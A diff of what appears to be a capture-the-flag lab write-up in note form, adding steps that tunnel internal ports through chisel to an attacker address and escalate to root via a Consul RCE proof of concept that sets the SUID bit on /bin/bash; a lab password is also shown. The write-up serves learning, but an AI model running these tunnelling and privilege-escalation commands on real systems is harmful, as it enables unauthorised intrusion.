@@ -106,8 +106,6 @@ Users: `ralph, postgres, ron`
 >[!example]- View
 >![[Pasted image 20250405195845.png]]
 
-
-
 ## Cracking Password (Ralph)
 - We found a sqlite3 file so if we dump it we get a hash `../../storage/development.sqlite3`
 >[!example]- View
@@ -239,3 +237,40 @@ netstat -nat
 Credentials: `ron:AdmiDi0_pA$$w0rd`
 
 ## Enumeration 2: (ron)
+- As we see before there are some interesting open ports so lets use [[chisel]] to port forwarding
+```bash
+wget https://github.com/jpillora/chisel/releases/download/v1.7.4/chisel_1.7.4_linux_amd64.gz
+gunzip chisel_1.7.4_linux_amd64.gz
+chmod +x chisel_1.7.4_linux_amd64
+mv chisel_1.7.4_linux_amd64 chisel
+```
+
+Attacker:
+```bash
+./chisel server --reverse --port 1234
+```
+>[!example]- Result
+>![[Pasted image 20250405232827.png]]
+>![[Pasted image 20250405233437.png]]
+
+Victim:
+```bash
+netstat -nat | grep "LISTEN"
+./chisel client 10.10.16.3:1234 R:localhost:3000 R:localhost:3001 R:localhost:8500 R:localhost:8503 R:localhost:8600 R:localhost:8300 R:localhost:8301 R:localhost:5432 &
+```
+>[!example]- Result
+>![[Pasted image 20250405232645.png]]
+
+- One of this ports looks quiet interesting
+>[!example]- View
+>![[Pasted image 20250405235215.png]]
+>![[Pasted image 20250405235218.png]]
+
+## Getting Access (Root)
+- This version is vulnerable to RCE, because this endpoint allow remote command execution: `/v1/agent/service/register` using the method `PUT`, we can use this [PoC](https://github.com/owalid/consul-rce/blob/main/consul_rce.py) in order to abuse it
+```bash
+python3 consul_rce.py -th localhost -tp 8500 -c "chmod +s /bin/bash"
+```
+>[!example]- Result
+>![[Pasted image 20250406000649.png]]
+
